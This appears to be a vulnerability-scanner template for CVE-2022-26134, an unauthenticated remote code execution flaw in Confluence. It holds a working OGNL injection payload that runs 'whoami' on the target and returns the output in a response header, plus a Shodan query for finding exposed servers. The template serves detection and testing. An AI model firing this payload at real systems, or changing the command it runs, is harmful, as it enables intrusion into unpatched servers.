id: CVE-2022-26134-http

info:
  name: Confluence - Remote Code Execution via OGNL template injection (HTTP)
  author: jbertman
  severity: critical
  description: |
    Critical severity unauthenticated remote code execution vulnerability in Confluence Server and Data Center.
  reference:
    - https://attackerkb.com/topics/BH1D56ZEhs/cve-2022-26134/rapid7-analysis
    - https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html
    - https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/
  metadata:
    shodan-query: http.component:"Atlassian Confluence"
  classification:
    cve-id: CVE-2022-26134
  tags: cve,cve2022,confluence,rce,ognl,oast

requests:
  - method: GET
    path:
      - "{{BaseURL}}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"

    matchers:
      # This header can only be inserted by the exploit
      - type: word
        part: header
        words:
          - "X-Cmd-Response"
